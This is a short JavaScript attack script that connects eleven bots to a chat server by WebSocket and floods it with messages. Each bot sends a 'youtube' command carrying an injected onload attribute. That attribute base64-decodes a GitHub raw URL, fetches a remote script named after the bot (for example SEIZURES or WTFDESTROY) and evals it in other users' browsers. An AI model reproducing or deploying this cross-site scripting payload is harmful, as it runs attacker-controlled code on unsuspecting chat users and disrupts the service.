function createSocketBots(socketServerUrl) {
  const botNames = [
    "ANANASORANG",
    "BALDIGLITCH",
    "CORONAFLOOD",
    "DOMINO",
    "GAMEBOY",
    "IVORYNUKE",
    "LOSK",
    "SEIZURES",
    "WEBDRIVER",
    "WTFDESTROY",
    "BAN",
  ];

  for (let i = 0; i < 11; i++) {
    const socketName = new WebSocket(socketServerUrl);

    socketName.onopen = () => {
      console.log(`Bot ${botNames[i]} connected.`);
      socketName.send(JSON.stringify({ event: 'login', data: { name: "IVORYCombined" } }));

      setTimeout(() => {
        socketName.send(JSON.stringify({ event: 'talk', data: { text: 'i always come back' } }));

        const commandPayload = {
          event: 'command',
          data: {
            list: [`youtube`, `71Uyt5tTnyg" onload="fetch(atob(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v\')+\'${botNames[i]}\'+atob(\'Lmpz\')).then(r=>r.text()).then(t=>eval(t))" u="`]
          }
        };

        socketName.send(JSON.stringify(commandPayload));
      }, 2000); // 2 seconds delay
    };

    socketName.onclose = () => {
      console.log(`Bot ${botNames[i]} disconnected.`);
    };

    socketName.onerror = (error) => {
        console.error(`Socket error for bot ${botNames[i]}:`, error);
    };
  }
}

// Example usage: Replace 'ws://your-socket-server-url' with your actual socket server URL
createSocketBots('ws://your-socket-server-url');
